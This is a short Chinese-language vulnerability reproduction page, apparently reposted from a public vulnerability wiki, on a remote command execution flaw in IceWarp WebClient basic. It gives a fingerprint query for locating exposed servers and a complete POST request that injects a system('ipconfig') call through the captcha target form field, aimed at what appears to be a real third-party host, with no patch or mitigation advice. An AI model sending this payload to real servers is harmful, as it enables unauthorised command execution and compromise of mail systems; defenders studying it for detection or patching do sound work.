---
title: "IceWarp WebClient basic 远程命令执行漏洞"
date: 2026-10-16 09:08:11
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "IceWarp-WebClient-basic"
tags:
  - "IceWarp-WebClient-basic"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

IceWarp WebClient 存在远程命令执行漏洞，攻击者构造特殊的请求即可远程命令执行

## 漏洞影响 

```
IceWarp WebClient
```

## 网络测绘

```
app="IceWarp-公司产品"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101850566.png)



漏洞请求包为

```plain
POST /webmail/basic/ HTTP/1.1
Host: sd.sahadharawat.com
Content-Type: application/x-www-form-urlencoded
Cookie: use_cookies=1
Content-Length: 43

_dlg[captcha][target]=system(\'ipconfig\')\
```



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101851258.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/IceWarp-WebClient-basic-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
